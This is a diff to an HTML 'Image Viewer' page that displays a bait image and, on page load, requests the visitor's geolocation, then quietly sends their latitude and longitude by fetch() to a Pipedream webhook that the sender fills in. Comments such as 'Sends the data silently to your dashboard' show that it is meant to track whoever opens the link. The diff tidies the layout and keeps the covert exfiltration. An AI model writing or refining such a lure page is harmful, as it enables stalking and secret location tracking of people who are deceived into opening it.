@@ -4,32 +4,27 @@
     <title>Image Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        /* Black background, image centered, no text */
-        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        img { max-width: 100%; max-height: 100vh; }
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: white; font-family: sans-serif; }
+        img { max-width: 100%; max-height: 100vh; display: block; }
+        .error-msg { display: none; }
     </style>
 </head>
 <body onload="getLocation()">
 
-    <img src="bait.jpg">
+    <img src="bait.jpg" id="target-img" onerror="document.getElementById('err').style.display='block';">
+    
+    <div id="err" class="error-msg">Photo Loading... (If this stays, check your file name)</div>
 
     <script>
-        // !!! PASTE YOUR PIPEDREAM LINK BETWEEN THE QUOTES BELOW !!!
+        // REPLACE THIS with your Pipedream URL
         const gate = "PASTE_YOUR_PIPEDREAM_URL_HERE";
 
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
+                });
             }
-        }
-
-        function showPosition(position) {
-            // Sends the data silently to your dashboard
-            fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
-        }
-
-        function showError(error) {
-            console.log("Denied");
         }
     </script>
 </body>
